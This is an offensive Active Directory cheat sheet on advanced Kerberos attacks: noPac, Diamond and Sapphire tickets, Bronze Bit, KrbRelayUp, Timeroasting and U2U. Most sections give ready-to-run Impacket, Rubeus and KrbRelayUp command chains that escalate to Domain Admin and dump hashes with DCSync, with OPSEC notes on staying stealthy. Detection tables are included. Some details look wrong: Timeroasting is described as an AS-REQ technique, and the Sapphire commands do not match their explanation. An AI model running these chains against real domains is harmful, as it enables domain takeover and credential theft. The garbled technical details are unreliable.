# Phase 13: Advanced Kerberos Attacks

> Beyond Kerberoasting and AS-REP. Techniques that abuse Kerberos protocol internals at a deeper level.

---

## Table of Contents
1. [noPac / sAMAccountName Spoofing (CVE-2021-42278/42287)](#1-nopac--samaccountname-spoofing)
2. [Diamond Ticket](#2-diamond-ticket)
3. [Sapphire Ticket](#3-sapphire-ticket)
4. [Bronze Bit (CVE-2020-17049)](#4-bronze-bit)
5. [KrbRelay / KrbRelayUp (Local Privilege Escalation)](#5-krbrelay--krbrelayup)
6. [Timeroasting](#6-timeroasting)
7. [Kerberos U2U (User-to-User)](#7-kerberos-u2u)

---

## 1. noPac / sAMAccountName Spoofing

**CVE-2021-42278 + CVE-2021-42287 — combined = DA from any domain user on unpatched DCs**

**Concept**: Two bugs chained together.
- **42278**: You can rename a machine account's `sAMAccountName` to match a DC's name (e.g., `DC01`) without the trailing `$`.
- **42287**: When the KDC can't find a requested server principal after ticket issuance, it appends `$` and retries. Combined: request a TGT as `DC01` (your renamed machine account) → request a service ticket → KDC looks for `DC01`, fails, tries `DC01$` (the real DC) → issues a ticket as the DC machine account → DCSync.

**Prerequisites**: Any domain account + `ms-DS-MachineAccountQuota > 0` (default 10).

```bash
# All-in-one: noPac.py
python3 noPac.py lab.local/jdoe:Password1 -dc-ip 10.10.10.10 --impersonate administrator -use-ldap

# Manual chain (Impacket)
# Step 1: Create computer account
addcomputer.py -computer-name 'PWN$' -computer-pass 'PwnPass123!' lab.local/jdoe:Password1 -dc-ip 10.10.10.10

# Step 2: Rename sAMAccountName (drop the $)
renameMachine.py -current-name 'PWN$' -new-name 'DC01' lab.local/jdoe:Password1 -dc-ip 10.10.10.10

# Step 3: Get TGT as DC01 (our renamed machine)
getTGT.py lab.local/'DC01':PwnPass123! -dc-ip 10.10.10.10

# Step 4: Restore sAMAccountName (rename back so KDC can't find DC01)
renameMachine.py -current-name 'DC01' -new-name 'PWN$' lab.local/jdoe:Password1 -dc-ip 10.10.10.10

# Step 5: Use the TGT to get a service ticket — KDC does the DC01 → DC01$ retry
export KRB5CCNAME=DC01.ccache
getST.py -self -impersonate administrator -spn cifs/dc01.lab.local lab.local/'DC01':PwnPass123! -dc-ip 10.10.10.10 -no-pass -k

# Step 6: DCSync
export KRB5CCNAME=administrator@cifs_dc01.lab.local.ccache
secretsdump.py -k -no-pass dc01.lab.local
```

**Patch status**: Addressed in November 2021 patches (KB5008380 / KB5008602). Check DC patch level first.

```bash
# Quick check: is the DC patched?
nxc smb 10.10.10.10 -u jdoe -p Password1 -M nopac
```

🔴 **OPSEC**: Machine account creation (Event 4741), sAMAccountName change (Event 4738 on the machine account object), then anomalous TGT for a name that looks like a DC.

**Detection (Blue Team)**:
- Event 4738 showing sAMAccountName changed to match a DC name
- Event 4741 immediately before 4738 (new machine then renamed)
- Defender for Identity has direct "noPac" detection signature

---

## 2. Diamond Ticket

**Concept**: Instead of forging a TGT from scratch (Golden Ticket), request a *legitimate* TGT from the KDC for a real account, then decrypt and modify its PAC in-place (adding group SIDs, changing expiry etc.), then re-sign with the krbtgt key. The result is a ticket that has a real AS-REQ event on the DC — much harder to detect than a Golden Ticket that has no corresponding AS-REQ.

**Prerequisite**: krbtgt AES256 key (from DCSync).

```powershell
# Rubeus — request a real ticket for a low-priv user, patch the PAC to add DA membership
.\Rubeus.exe diamond /user:jdoe /password:Password1 /enctype:aes256 \
  /krbkey:<krbtgt_AES256> \
  /domain:lab.local /dc:dc01.lab.local \
  /ticketuser:administrator /ticketuserid:500 \
  /groups:512 /nowrap /ptt
```

```bash
# Impacket (ticketer with diamond mode)
ticketer.py -request -user jdoe -password Password1 \
  -aesKey <krbtgt_AES256> \
  -domain-sid S-1-5-21-... -domain lab.local \
  -groups 512,519 administrator
```

**Why stealthier than Golden Ticket**:
- A real AS-REQ / AS-REP event appears on the DC (Event 4768) — no missing logon event
- Ticket lifetime matches domain policy (not 10 years)
- Encryption type matches what the DC would normally issue
- Difficult to distinguish from legitimate auth without PAC inspection

🟡 **OPSEC**: Much stealthier than Golden. Detection requires inspecting the PAC content for group SID inflation — not a default alert in most SIEMs or DfI.

---

## 3. Sapphire Ticket

**Concept**: Like Diamond but goes one step further — impersonates a specific real user by extracting their *actual* PAC from the KDC using the S4U2self trick, then embedding it into a new ticket. The PAC is completely legitimate (not crafted), so no PAC forgery detector will fire.

**Prerequisite**: krbtgt AES256 key + access to make S4U2self requests.

```powershell
# Rubeus
.\Rubeus.exe golden /user:administrator /domain:lab.local \
  /dc:dc01.lab.local \
  /aes256:<krbtgt_AES256> \
  /enctype:aes256 \
  /nowrap /ptt \
  /printcmd    # shows the PAC-aware forging

# More explicit: use /sapphire flag (newer Rubeus builds)
.\Rubeus.exe diamond /tgtdeleg /krbkey:<krbtgt_AES256> \
  /ticketuser:administrator /nowrap /ptt
```

**Key difference from Diamond**: Sapphire fetches the target user's real PAC via S4U2self (so group membership, UAC flags, etc. are all real), not synthesized. Even PAC validation won't catch it.

🟢 **OPSEC**: Currently one of the stealthiest ticket forging options. S4U2self generates Event 4769, but that's normal for services using constrained delegation — hard to distinguish without deep Kerberos traffic analysis.

---

## 4. Bronze Bit (CVE-2020-17049)

**Concept**: A patch bypass for constrained delegation. The `forwardable` flag in a Kerberos ticket was supposed to prevent certain delegation scenarios for "sensitive" accounts (Protected Users, accounts with "Account is sensitive and cannot be delegated" set). CVE-2020-17049 allowed bypassing the forwardable flag check — impersonating accounts that should be non-delegatable via constrained delegation.

**Prerequisites**: A compromised service account with constrained delegation rights.

```bash
# Check if target is patched (November 2020 cumulative update)
# Exploit: getST.py with -force-forwardable flag
getST.py -spn cifs/dc01.lab.local -impersonate administrator \
  -force-forwardable \
  'lab.local/svc_web:Password1' -dc-ip 10.10.10.10
```

**Patch status**: Fixed November 2020. Still relevant for unpatched or legacy DCs.

🟡 **OPSEC**: Standard S4U2self/S4U2proxy Events 4769. The anomaly is impersonating an account that should not be delegatable — detectable with PAC inspection.

---

## 5. KrbRelay / KrbRelayUp (Local Privilege Escalation)

**Concept**: Kerberos relay — distinct from NTLM relay. Abuses the fact that Kerberos authentication can be triggered locally and relayed to LDAP/LDAPS. Used for local privilege escalation (no domain account needed, just a local shell) by:
1. Triggering a Kerberos auth from a privileged process (SYSTEM or NETWORK SERVICE) to a local port you control
2. Relaying that auth to LDAP on the DC
3. Using the LDAP session (as the machine account) to grant yourself RBCD or DCSync rights

**Prerequisites**: Local shell (even low-priv), LDAP accessible from the host.

```powershell
# KrbRelayUp — all-in-one local privesc
.\KrbRelayUp.exe relay -Domain lab.local -CreateNewComputerAccount -ComputerName PWNED -ComputerPassword Pass123!
# Then: use RBCD chain to get local admin → SYSTEM

# KrbRelay (more manual, more control)
.\KrbRelay.exe -spn ldap/dc01.lab.local -clsid <COM_CLSID> -rbcd <attacker_machine_SID> -ssl
```

**Why this matters**: No domain account credentials required — escalates from any local user or service to SYSTEM on the local machine, then can use machine account for further attacks.

**Related CVEs**: Abuses COM activation cross-session relay (no specific CVE — design issue), with variants patched and re-found multiple times.

🔴 **OPSEC**: LDAP modifications from the machine account (adding RBCD attribute = Event 5136), Kerberos auth to localhost then outbound LDAP is anomalous. Defender for Identity has coverage for some variants.

**Detection**:
- LDAP modify to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the machine itself (circular RBCD)
- Event 4769 for Kerberos auth from the machine to itself
- S4U2self chain originating from the victim machine account

---

## 6. Timeroasting

**Concept**: Request AS-REQs for computer accounts that pre-authenticate with their password hash (RC4). Computer account passwords are normally long and random, but **pre-Windows-2000 compatible accounts** (created with "User must change password at next logon" or created for old systems) may have a password equal to the lowercase machine name — e.g., `WORKSTATION01` → password `workstation01`. Timeroasting uses the Kerberos timestamp field to recover these.

```bash
# Timeroast — enumerate and extract computer account hashes
python3 timeroast.py lab.local/jdoe:Password1 -dc-ip 10.10.10.10 -o timeroast.txt

# Crack — short, predictable passwords on pre-W2k accounts
hashcat -m 27100 timeroast.txt wordlist.txt
# Or: the machine name itself (lowercase) is the #1 candidate
echo "workstation01" | hashcat -m 27100 timeroast.txt --stdin
```

**Pre-Windows-2000 account password default**: When an account is created with "pre-Windows 2000 compatible access" (old GUI option), the default password is the sAMAccountName in lowercase. This was a real, exploited primitive as recently as 2024 in environments with old domain policies.

🟢 **OPSEC**: AS-REQ to the DC — looks like normal Kerberos auth failures. No Event 4625 (that's for NTLM). Volume-based detection only.

---

## 7. Kerberos U2U (User-to-User)

**Concept**: Kerberos U2U lets a service authenticate to another service using a session key rather than a long-term key. This is normally used for peer-to-peer auth. The attack use-case: if you can trigger U2U auth from a service, you receive a ticket encrypted with the session key from the service's TGT — and if you have that TGT (e.g., AS-REP for an AS-REP-roastable account), you can decrypt the U2U ticket.

More practically, **CVE-2022-33679** used RC4-MD4 downgrade in the pre-auth stage to crack TGTs — this is now patched but demonstrates that Kerberos protocol downgrade attacks continue to be a research area.

```bash
# Current practical application: requesting U2U tickets for accounts you can trigger auth for
# Primarily a research/CTF technique; less commonly exploitable in prod
# Reference: https://www.thehacker.recipes/a-d/movement/kerberos/kerberos-u2u
```

This section is included for completeness — monitor SpecterOps and the Hacker Recipes for current practical weaponization.

---

## Quick Reference: When to Use What

| Situation | Technique |
|-----------|-----------|
| Unpatched DC (pre-Nov 2021), any domain user | **noPac** → DA |
| Have krbtgt key, want stealth over Golden | **Diamond Ticket** (real AS-REQ, patched PAC) |
| Need fully authentic PAC, no forgery detectors | **Sapphire Ticket** (real PAC via S4U) |
| Service account with constrained delegation on patched DC | **Bronze Bit** (if pre-Nov 2020 patch level) |
| Low-priv local shell, need local privesc | **KrbRelayUp** → RBCD → SYSTEM |
| Pre-W2k compatible machine accounts | **Timeroasting** → crack predictable passwords |

---

## Detection Summary

| Attack | Key Signal |
|--------|-----------|
| noPac | Event 4738 — sAMAccountName matches DC name |
| Diamond/Sapphire | PAC group inflation (requires specialized PAC inspection tool) |
| Bronze Bit | S4U for account with "sensitive" flag |
| KrbRelayUp | LDAP modify on machine's own RBCD attribute |
| Timeroasting | Volume AS-REQ for computer accounts from single source |
